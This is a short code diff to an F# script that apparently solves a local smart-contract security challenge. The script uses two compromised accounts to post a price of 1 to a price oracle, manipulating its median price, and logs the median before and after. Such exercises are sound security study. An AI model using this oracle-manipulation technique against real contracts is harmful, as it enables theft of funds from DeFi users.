@@ -25,10 +25,11 @@ let compromisedAccount81a5 = createWeb3Environment "127.0.0.1:1248" "2.0" "0x81a
 let compromisedAccountE924 = createWeb3Environment "127.0.0.1:1248" "2.0" "0xe92401a4d3af5e446d93d11eec806b1462b39d15"
 
 callDevWith1 trustedOracle (ByString "getMedianPrice") [symbol] |> logIt
-makeEthTxn compromisedAccount81a5 trustedOracle (ByString "postPrice") [symbol; Uint256 $"1"] ZEROV |> logIt
-makeEthTxn compromisedAccountE924 trustedOracle (ByString "postPrice") [symbol; Uint256 $"1"] ZEROV |> logIt
+makeEthTxn compromisedAccount81a5 trustedOracle (ByString "postPrice") [symbol; Uint256 "1"] ZEROV |> logIt
+makeEthTxn compromisedAccountE924 trustedOracle (ByString "postPrice") [symbol; Uint256 "1"] ZEROV |> logIt
 callDevWith1 trustedOracle (ByString "getMedianPrice") [symbol] |> logIt
 
+// Checking median price before and after manipulation
 (*
 [+] Call result:
 Uint256 999000000000000000000
